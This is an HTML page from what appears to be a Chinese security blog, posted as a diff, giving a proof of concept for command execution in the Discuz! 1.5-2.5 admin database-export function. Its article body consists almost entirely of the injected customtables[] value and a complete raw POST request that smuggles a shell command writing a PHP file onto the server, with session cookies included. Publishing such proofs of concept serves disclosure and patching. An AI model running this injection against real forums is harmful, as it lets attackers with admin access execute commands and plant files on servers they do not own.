@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="Discuz! 1.5-2.5 命令执行漏洞影响版本 Discuz! 1.5-2.5 POC需要登入后台。  修改的参数 参数customtables[] customtables%5B%5D=pre_common_admincp_cmenu&amp;quot;&amp;gt;aaa; echo &amp;apos;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;apos; &amp;gt; phpinfo.php # 数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ALL BLUE">
+<meta property="og:url" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="Discuz! 1.5-2.5 命令执行漏洞影响版本 Discuz! 1.5-2.5 POC需要登入后台。  修改的参数 参数customtables[] customtables%5B%5D=pre_common_admincp_cmenu&amp;quot;&amp;gt;aaa; echo &amp;apos;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;apos; &amp;gt; phpinfo.php # 数据">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz!%201.5-2.5%20命令执行漏洞/Discuz!%201.5-2.5%20命令执行漏洞/1.png">
+<meta property="og:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz!%201.5-2.5%20命令执行漏洞/Discuz!%201.5-2.5%20命令执行漏洞/2.png">
+<meta property="og:updated_time" content="2021-03-24T15:33:31.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ALL BLUE">
+<meta name="twitter:description" content="Discuz! 1.5-2.5 命令执行漏洞影响版本 Discuz! 1.5-2.5 POC需要登入后台。  修改的参数 参数customtables[] customtables%5B%5D=pre_common_admincp_cmenu&amp;quot;&amp;gt;aaa; echo &amp;apos;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;apos; &amp;gt; phpinfo.php # 数据">
+<meta name="twitter:image" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz!%201.5-2.5%20命令执行漏洞/Discuz!%201.5-2.5%20命令执行漏洞/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ALL BLUE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/07/16/01-CMS漏洞/Discuz/discuz-ml-rce/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/07/16/01-CMS漏洞/DedeCMS/DedeCms后台地址泄露漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Discuz-1-5-2-5-命令执行漏洞"><span class="toc-number">1.</span> <span class="toc-text">Discuz! 1.5-2.5 命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">1.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.3.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T03:12:35.028Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Discuz-1-5-2-5-命令执行漏洞"><a href="#Discuz-1-5-2-5-命令执行漏洞" class="headerlink" title="Discuz! 1.5-2.5 命令执行漏洞"></a>Discuz! 1.5-2.5 命令执行漏洞</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>Discuz! 1.5-2.5</strong></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>需要登入后台。</p>
+<p><img src="Discuz! 1.5-2.5 命令执行漏洞/1.png" alt="1"><br><img src="Discuz! 1.5-2.5 命令执行漏洞/2.png" alt="2"></p>
+<p>修改的参数</p>
+<p>参数<code>customtables[]</code></p>
+<pre><code>customtables%5B%5D=pre_common_admincp_cmenu&quot;&gt;aaa; echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt; phpinfo.php #
+</code></pre><p>数据包</p>
+<pre><code>POST /discuz25/admin.php?action=db&amp;operation=export&amp;setup=1 HTTP/1.1
+Host: localhost
+Content-Length: 252
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/discuz25/admin.php?action=db&amp;operation=export
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09
+Connection: close
+
+formhash=0d2eaac0&amp;scrolltop=&amp;anchor=&amp;type=custom&amp;customtables%5B%5D=pre_common_admincp_cmenu&quot;&gt;aaa; echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt; phpinfo.php #&amp;method=shell&amp;extendins=0&amp;sqlcompat=&amp;usehex=1&amp;usezip=0&amp;filename=181219_u0CC19kJ&amp;exportsubmit=%E6%8F%90%E4%BA%A4
+</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://paper.seebug.org/763/" target="_blank" rel="noopener">https://paper.seebug.org/763/</a></p>
+<p><a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">https://github.com/FoolMitAh/CVE-2018-14729</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Discuz-1-5-2-5-命令执行漏洞"><span class="toc-number">1.</span> <span class="toc-text">Discuz! 1.5-2.5 命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-number">1.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.3.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/Discuz/Discuz! 1.5-2.5 命令执行漏洞/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
